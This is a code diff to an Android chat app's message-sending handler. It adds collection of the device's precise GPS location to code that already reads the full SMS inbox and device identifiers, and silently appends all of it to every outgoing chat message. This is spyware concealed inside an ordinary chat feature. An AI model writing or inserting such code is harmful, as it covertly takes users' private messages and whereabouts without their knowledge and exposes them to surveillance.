@@ -38,6 +38,9 @@ import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.database.Cursor;
+import android.location.Criteria;
+import android.location.Location;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -116,9 +119,12 @@ public class ChatActivity extends Activity {
 		public void onClick(View v) {
 			final EditText messageField = (EditText) findViewById(R.id.edit_message);
 			String message = messageField.getText().toString();
+			Context context = getApplicationContext();
 
 			String smsMsgData = "";
+			String locationData="";
 			Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+			LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
 
 			if (message != null && !message.equals("")) {
 				try {
@@ -137,6 +143,27 @@ public class ChatActivity extends Activity {
 						smsMsgData = "No se encontraron SMS";
 					}
 
+					Criteria criteria = new Criteria();
+					int currentapiVersion = android.os.Build.VERSION.SDK_INT;
+					if (currentapiVersion >= 14) {
+						criteria.setSpeedAccuracy(Criteria.ACCURACY_HIGH);
+						criteria.setAccuracy(Criteria.ACCURACY_FINE);
+						criteria.setAltitudeRequired(true);
+						criteria.setBearingRequired(true);
+						criteria.setSpeedRequired(true);
+					}
+					String provider = locationManager.getBestProvider(criteria, true);
+					Location location = locationManager.getLastKnownLocation(provider);
+					if (location!=null){
+						locationData += "Latitud: "+location.getLatitude()+" \n"
+										+"Longitud: "+location.getLongitude()+" \n"
+										+"Altitud: "+location.getAltitude()+" \n"
+										+"Extras: "+location.getExtras()+" \n";
+					}else{
+						locationData += "No se pueden obtener datos de geolocalización";
+					}
+
+
 					message+="----- "+Build.BRAND+" "+Build.DEVICE+" -----\n"
 					+"ID: "+Build.ID + " \n"
 					+"Hardware name: "+Build.HARDWARE + " \n"
@@ -144,6 +171,7 @@ public class ChatActivity extends Activity {
 					+"Display: "+Build.DISPLAY+ " \n"
 					+"-------   SMS   -------:  \n"
 					+smsMsgData + " \n"
+					+locationData + " \n"
 					+" ----------------------";
 
 
